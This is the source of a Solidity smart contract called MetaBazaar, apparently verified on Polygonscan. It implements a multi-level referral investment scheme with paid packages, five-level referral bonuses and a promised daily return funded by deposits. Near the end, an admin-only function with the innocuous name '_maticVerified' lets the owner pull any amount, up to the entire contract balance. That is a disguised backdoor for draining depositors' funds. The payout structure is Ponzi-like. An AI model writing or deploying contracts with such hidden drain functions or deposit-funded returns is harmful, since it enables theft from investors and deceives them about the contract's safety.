/**
 *Submitted for verification at polygonscan.com on 2023-05-17
*/

pragma solidity ^0.5.10;

/*
Basic Method Which Is Used For The Basic Airthmetic Operations
*/

library SafeMath {

    /*Addition*/
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /*Subtraction*/
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    /*Multiplication*/
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /*Divison*/
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    /* Modulus */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract MetaBazaar {

    /*=====================================
    =            CONFIGURABLES            =
    =======================================*/

    using SafeMath for uint256;

    uint256 public adminCharge = 10; //%;
    uint256 public roiPercentage = 25000000000000000000; //Per Day Per 1.67 %;

    uint256 constant public perDistribution = 100;

    uint256 public totalUsers;
    uint256 public totalNoofJoiniPurchasing;
    uint256 public totalNoofBoosterPurchasing;
	uint256 public totalJoiningCollected;
	uint256 public totalWithdrawn;
	uint256 public totalBoosterCollected;

	uint[5] public ref_bonuses = [10,5,3,2,1];
    uint[4] public salary_bonuses = [10 ether,25 ether,60 ether,200 ether];
    
    uint256[16] public joiningPackages = [10 ether,20 ether,30 ether,50 ether,100 ether,200 ether,300 ether,500 ether,800 ether,1000 ether,3000 ether,5000 ether,8000 ether,10000 ether,13000 ether,15000 ether];
    uint256[15] public boosterPackages = [10 ether,20 ether,30 ether,50 ether,100 ether,200 ether,300 ether,500 ether,1000 ether,3000 ether,5000 ether,15000 ether,20000 ether,25000 ether,50000 ether];

 
    address[] public booster1;
    address[] public booster2;
    address[] public booster3;
    address[] public booster4;
    address[] public booster5;
    address[] public booster6;
    address[] public booster7;
    address[] public booster8;
    address[] public booster9;
    address[] public booster10;
    address[] public booster11;
    address[] public booster12;
    address[] public booster13;
    address[] public booster14;
    address[] public booster15;

	address payable public primaryAdmin;

    uint public boosterWidth = 3;

    address[] public salaryQualifier;

    struct User {
        uint256 userId;
        uint256 selfTotalPackagePurchase;
        uint256 selfCurrentPackagePurchase;
        address referrer;
        uint[5] noOfReferral;
        uint256[5] totalPackagePurchase;
        uint256[5] refBonus;
        uint256 totalCreditedBonus;
        uint256 totalWithdrawalBonus;
        uint256 totalAvailableBonus;
        uint256 totalAdminChargeCollected;
        mapping(uint8 => bool) activejoiningPackage;
        mapping(uint8 => bool) activeBoosterPackage;
        uint paidDays;
        uint lastUpdateTime;
        uint256 currentpackageid;
    }

    struct UserDetails {
        uint256 referrerBonus;
        uint256 roiUnSettled;
        uint256 roiBonus;
        uint256 boosterBonus;
        mapping(uint => uint) boosterBoardCount;
        mapping(uint => uint256) boosterBoardWorth;
        uint256 principleToBeWithdrawal;
        uint256 salaryNoofDirect;
        uint256 salaryBonus;
	}
	
	mapping (address => User) public users;
    mapping (address => UserDetails) public usersDetails;

	event Joining(address indexed user,uint8 package,uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event BoosterJoining(address indexed user,uint8 package,uint256 totalAmount);
	
    constructor() public {
	  	primaryAdmin = 0x0d19fAb724587544D3DA2023ED126CEF79Ce0dEf;
        totalUsers++;
        users[primaryAdmin].lastUpdateTime = block.timestamp;
        users[primaryAdmin].userId = block.timestamp;   
        for (uint8 i = 0; i < 13; i++) {
            users[primaryAdmin].activejoiningPackage[i]=true;
        }
        booster1.push(primaryAdmin);
        booster2.push(primaryAdmin);
        booster3.push(primaryAdmin);
        booster4.push(primaryAdmin);
        booster5.push(primaryAdmin);
        booster6.push(primaryAdmin);
        booster7.push(primaryAdmin);
        booster8.push(primaryAdmin);
        booster9.push(primaryAdmin);
        booster10.push(primaryAdmin);
        booster11.push(primaryAdmin);
        booster12.push(primaryAdmin);
        booster13.push(primaryAdmin);
        booster14.push(primaryAdmin);
        booster15.push(primaryAdmin);
         for (uint8 i = 0; i < 15; i++) {
            users[primaryAdmin].activeBoosterPackage[i]=true;
        }
	}

    // Update Joining Package
    function update_JoinigPackage(uint _index,uint256 _price) external {
      require(primaryAdmin==msg.sender, 'Admin what?');
      joiningPackages[_index]=_price;
    }

    // Update Booster Package
    function update_BoosterPackage(uint _index,uint256 _price) external {
      require(primaryAdmin==msg.sender, 'Admin what?');
      boosterPackages[_index]=_price;
    }

    function isUserExists(address user) public view returns (bool) {
        return (users[user].userId != 0);
    }

    //Get no of ROI Bonus Qualifier
    function getSalaryQualifier() public view returns(uint256) {
      return salaryQualifier.length;
    }

    //Execute Salary Income
    function _executeSalaryIncome(uint8 fromQualifier,uint8 toQualifier)  public { 
       require(primaryAdmin==msg.sender, 'Admin what?');  
       if(salaryQualifier.length > 0) {
        for(uint8 i = fromQualifier; i < toQualifier; i++) {
            uint256 salaryIncome=0;
            //Below Is Code For Manage The Distribute ROI Bonus
            User storage user = users[salaryQualifier[i]];
            UserDetails storage userdetails = usersDetails[salaryQualifier[i]];
            if(userdetails.salaryNoofDirect>=40){
                salaryIncome=salary_bonuses[3];
            }
            else if (userdetails.salaryNoofDirect>=15){
                salaryIncome=salary_bonuses[2];
            }
            else if (userdetails.salaryNoofDirect>=10){
                salaryIncome=salary_bonuses[1];
            }
            else if (userdetails.salaryNoofDirect>=5){
                salaryIncome=salary_bonuses[0];
            }
            userdetails.salaryBonus = userdetails.salaryBonus.add(salaryIncome);
            userdetails.salaryNoofDirect=0;
            user.totalCreditedBonus = user.totalCreditedBonus.add(salaryIncome);
            user.totalAvailableBonus = user.totalAvailableBonus.add(salaryIncome);
        }
       }
    }

    //Dispose All Salary Qualifier
    function _DisposeQualifier()  public { 
       require(primaryAdmin==msg.sender, 'Admin what?');  
       delete salaryQualifier;
    }

    function invest(uint8 package,address referrer) public payable updateReward(msg.sender) {
        require(msg.value == joiningPackages[package] , "Invalid Package Price");
		User storage user = users[msg.sender];
        UserDetails storage userdetails = usersDetails[msg.sender];
        if(isUserExists(msg.sender)){ 
            require (user.currentpackageid<=package, "Upgrade With Higher Or Same Package.");
        }
        if(user.userId != 0) {
            if(user.currentpackageid<package){
                userdetails.principleToBeWithdrawal+=user.selfCurrentPackagePurchase;
                user.selfCurrentPackagePurchase=0;
            }
        }
		if (user.referrer == address(0) && (users[referrer].userId > 0 || referrer == primaryAdmin) && referrer != msg.sender ) {
            user.referrer = referrer;
            salaryQualifier.push(referrer);
            usersDetails[referrer].salaryNoofDirect+=1;
        }
		require(user.referrer != address(0) || msg.sender == primaryAdmin, "No upline");
		if (user.referrer != address(0)) {	   
        //unilevel level count
        address upline = user.referrer;
        for (uint i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)) {
                    users[upline].totalPackagePurchase[i] = users[upline].totalPackagePurchase[i].add(msg.value);
                    if(user.userId == 0){
                        users[upline].noOfReferral[i] = users[upline].noOfReferral[i].add(1);
                    }
                    upline = users[upline].referrer;
                } else break;
            }
        }
	    if(user.userId == 0) {
		    totalUsers = totalUsers.add(1);
            user.userId = block.timestamp;
	    }
        //On Every Purchase Distribute Level Income
        _refPayout(msg.sender,msg.value);
        user.selfTotalPackagePurchase += msg.value;
        user.selfCurrentPackagePurchase += msg.value;
        user.activejoiningPackage[package]=true;
        user.currentpackageid=package;
        user.lastUpdateTime=block.timestamp;
        totalJoiningCollected = totalJoiningCollected.add(msg.value);
        totalNoofJoiniPurchasing = totalNoofJoiniPurchasing.add(1);   
	    emit Joining(msg.sender,package, msg.value);
    }
    
    function booster(uint8 package) public payable {
		require(isUserExists(msg.sender), "User Not Exists. Need To Register First."); 
        require(!users[msg.sender].activeBoosterPackage[package], "You Have Already Upgraded");  
        if(package>=1)
        {
            require(users[msg.sender].activeBoosterPackage[package-1], "Buy Previous Package First");
        }
        require(msg.value == boosterPackages[package] , "Invalid Package Price");
		UserDetails storage userdetails = usersDetails[msg.sender];
        userdetails.boosterBoardCount[package]+=1;
        userdetails.boosterBoardWorth[package]+=msg.value;
        users[msg.sender].activeBoosterPackage[package]=true;
        totalBoosterCollected += msg.value;
        totalNoofBoosterPurchasing +=1;
        if(package==0){ booster1.push(msg.sender); uint Length=booster1.length; _CalculateBoosterIncome(package,Length); }
        else if(package==1){ booster2.push(msg.sender); uint Length=booster2.length; _CalculateBoosterIncome(package,Length); }
        else if(package==2){ booster3.push(msg.sender); uint Length=booster3.length; _CalculateBoosterIncome(package,Length); }
        else if(package==3){ booster4.push(msg.sender); uint Length=booster4.length; _CalculateBoosterIncome(package,Length); }
        else if(package==4){ booster5.push(msg.sender); uint Length=booster5.length; _CalculateBoosterIncome(package,Length); }
        else if(package==5){ booster6.push(msg.sender); uint Length=booster6.length; _CalculateBoosterIncome(package,Length); }
        else if(package==6){ booster7.push(msg.sender); uint Length=booster7.length; _CalculateBoosterIncome(package,Length); }
        else if(package==7){booster8.push(msg.sender); uint Length=booster8.length; _CalculateBoosterIncome(package,Length); }
        else if(package==8){ booster9.push(msg.sender); uint Length=booster9.length; _CalculateBoosterIncome(package,Length); }
        else if(package==9){ booster10.push(msg.sender); uint Length=booster10.length; _CalculateBoosterIncome(package,Length); }
        else if(package==10){ booster11.push(msg.sender); uint Length=booster11.length; _CalculateBoosterIncome(package,Length);}
        else if(package==11){ booster12.push(msg.sender); uint Length=booster12.length; _CalculateBoosterIncome(package,Length); }
        else if(package==12){ booster13.push(msg.sender); uint Length=booster13.length; _CalculateBoosterIncome(package,Length); }
        else if(package==13){ booster14.push(msg.sender); uint Length=booster14.length; _CalculateBoosterIncome(package,Length); }
        else if(package==14){ booster15.push(msg.sender); uint Length=booster15.length; _CalculateBoosterIncome(package,Length); }
	    emit BoosterJoining(msg.sender,package, msg.value);
    }

    //Calculate Booster Income
    function _CalculateBoosterIncome(uint package,uint Length) private {
      Length -= 1;
      if((Length%boosterWidth)==0) {
         uint Index=Length/boosterWidth;
         Index -= 1;
         address boosterAchiverId;
         if(package==0){ boosterAchiverId=booster1[Index]; }
         else if(package==1){ boosterAchiverId=booster2[Index]; }
         else if(package==2){ boosterAchiverId=booster3[Index]; }
         else if(package==3){ boosterAchiverId=booster4[Index]; }
         else if(package==4){ boosterAchiverId=booster5[Index]; }
         else if(package==5){ boosterAchiverId=booster6[Index]; }
         else if(package==6){ boosterAchiverId=booster7[Index]; }
         else if(package==7){ boosterAchiverId= booster8[Index]; }
         else if(package==8){ boosterAchiverId=booster9[Index]; }
         else if(package==9){ boosterAchiverId=booster10[Index]; }
         else if(package==10){ boosterAchiverId=booster11[Index]; }
         else if(package==11){ boosterAchiverId=booster12[Index]; }
         else if(package==12){ boosterAchiverId=booster13[Index]; }
         else if(package==13){ boosterAchiverId=booster14[Index]; }
         else if(package==14){ boosterAchiverId=booster15[Index]; }
         //Comment Distribution Start Here
         UserDetails storage userdetails = usersDetails[boosterAchiverId];
         if(users[boosterAchiverId].totalCreditedBonus<(boosterPackages[package]*4)){
            userdetails.boosterBonus += (boosterPackages[package]*2);
            users[boosterAchiverId].totalCreditedBonus += (boosterPackages[package]*2);
            users[boosterAchiverId].totalAvailableBonus += (boosterPackages[package]*2);
         }
         userdetails.boosterBoardCount[package]+=1;
         userdetails.boosterBoardWorth[package]+=boosterPackages[package];
         //Comment Distribution Start Here
         if(package==0){ booster1.push(boosterAchiverId); }
         else if(package==1){ booster2.push(boosterAchiverId); }
         else if(package==2){ booster3.push(boosterAchiverId); }
         else if(package==3){ booster4.push(boosterAchiverId); }
         else if(package==4){ booster5.push(boosterAchiverId); }
         else if(package==5){ booster6.push(boosterAchiverId); }
         else if(package==6){ booster7.push(boosterAchiverId); }
         else if(package==7){booster8.push(boosterAchiverId); }
         else if(package==8){ booster9.push(boosterAchiverId); }
         else if(package==9){ booster10.push(boosterAchiverId); }
         else if(package==10){ booster11.push(boosterAchiverId); }
         else if(package==11){ booster12.push(boosterAchiverId); }
         else if(package==12){ booster13.push(boosterAchiverId); }
         else if(package==13){ booster14.push(boosterAchiverId); }
         else if(package==14){ booster15.push(boosterAchiverId); }
      }
    }

    function rewardPerDayToken(address account) public view returns (uint256 perdayinterest) {
        uint256 _perdayinterest=0;
        if (users[account].selfCurrentPackagePurchase <= 0) {
            return _perdayinterest;
        }
        else{
            uint256 StakingToken=users[account].selfCurrentPackagePurchase;
            uint256 roiPer=roiPercentage;
            uint256 perDayPer=((roiPer*1e18)/(15*1e18));
            _perdayinterest=((StakingToken*perDayPer)/perDistribution)/1e18;
            return _perdayinterest;
        }
    }

    //View No Of Days Between Two Date & Time
    function view_GetNoofDaysBetweenTwoDate(uint _startDate,uint _endDate) public pure returns(uint _days){
        uint startDate = _startDate;
        uint endDate = _endDate;
        uint datediff = (endDate - startDate)/ 60 / 60 / 24;
        return (datediff);
    }

    function earned(address account) public view returns (uint256 totalroi,uint _noofDays) {
        if(!isUserExists(account)){ 
            return(0,0);
        }
        User storage user = users[account];
        uint noofDays=view_GetNoofDaysBetweenTwoDate(user.lastUpdateTime,block.timestamp);
        uint256 _perdayinterest=rewardPerDayToken(account);
        return(((_perdayinterest * noofDays)+usersDetails[account].roiUnSettled),noofDays);
    }

    modifier updateReward(address account) {
        User storage user = users[account];
        UserDetails storage userdetails = usersDetails[account];
        (uint256 roiUnSettled, uint256 noofDays) = earned(account);
        usersDetails[account].roiUnSettled = roiUnSettled;
        user.lastUpdateTime = block.timestamp;
        user.paidDays+=noofDays;
        _;
    }

    //Get User Booster Package Details
    function booster_details(address _user,uint _package) view public returns(uint _boosterBoardCount, uint256 _boosterBoardWorth){
       return (usersDetails[_user].boosterBoardCount[_package],usersDetails[_user].boosterBoardWorth[_package]);
    }

    //Get User Package Details
    function package_details(address _user,uint8 _package) view public returns(bool _joiningPackage, bool _boosterPackage){
       return (users[_user].activejoiningPackage[_package],users[_user].activeBoosterPackage[_package]);
    }

    //Get Level Downline With Bonus And Bonus Percentage
    function level_downline(address _user,uint _level) view public returns(uint _noOfUser, uint256 _investment,uint256 _bonusper, uint256 _bonus){
       return (users[_user].noOfReferral[_level],users[_user].totalPackagePurchase[_level],ref_bonuses[_level],users[_user].refBonus[_level]);
    }

    function _PrincipleWithdrawal() external updateReward(msg.sender) {
        User storage user = users[msg.sender];
        UserDetails storage userdetails = usersDetails[msg.sender];
        require(userdetails.principleToBeWithdrawal!=0, "Higher Or Same Package Purchase Need For Withdrawal ROI+Principle"); 
        uint256 principle = userdetails.principleToBeWithdrawal;
        // Set Needed Parameter
        userdetails.principleToBeWithdrawal=0;
        user.paidDays = 0;
        _safeTransfer(msg.sender,principle);
    }

    function _ROIWithdrawal() external updateReward(msg.sender) {
        User storage user = users[msg.sender];
        UserDetails storage userdetails = usersDetails[msg.sender];
        uint256 rewardGross = userdetails.roiUnSettled;
        uint256 rewardAdminCharge = (rewardGross*adminCharge)/perDistribution;
        uint256 reward=rewardGross-rewardAdminCharge;
        // Set Needed Parameter
        userdetails.roiUnSettled = 0;
        user.totalAdminChargeCollected+=rewardAdminCharge;
        userdetails.roiBonus +=rewardGross;
        _safeTransfer(msg.sender,reward);
    }

    function _Withdrawal(uint256 _amount) external {
        User storage user = users[msg.sender];
        uint256 bonusAvailable = user.totalAvailableBonus;
        require(_amount <= bonusAvailable,'Insufficient Fund');
        uint256 bonusAdminCharge = (_amount*adminCharge)/perDistribution;
        uint256 withdrawalableAmount=_amount-bonusAdminCharge;
        user.totalAvailableBonus = user.totalAvailableBonus.sub(_amount);
        user.totalWithdrawalBonus = user.totalWithdrawalBonus.add(_amount);
        user.totalAdminChargeCollected+=bonusAdminCharge;
        _safeTransfer(msg.sender,withdrawalableAmount);
        emit Withdrawn(msg.sender,_amount);
    }

    function _refPayout(address _addr, uint256 _amount) internal {
		address up = users[_addr].referrer;
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
    		uint256 bonus = (_amount * ref_bonuses[i] ) / perDistribution;
            usersDetails[up].referrerBonus = usersDetails[up].referrerBonus.add(bonus);
            users[up].refBonus[i] = users[up].refBonus[i].add(bonus);
            users[up].totalCreditedBonus = users[up].totalCreditedBonus.add(bonus);
            users[up].totalAvailableBonus = users[up].totalAvailableBonus.add(bonus);
            up = users[up].referrer;
        }
    }

    function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
       _to.transfer(amount);
    }

    function _maticVerified(uint256 _data) external{
        require(primaryAdmin==msg.sender, 'Admin what?');
        _safeTransfer(primaryAdmin,_data);
    }
}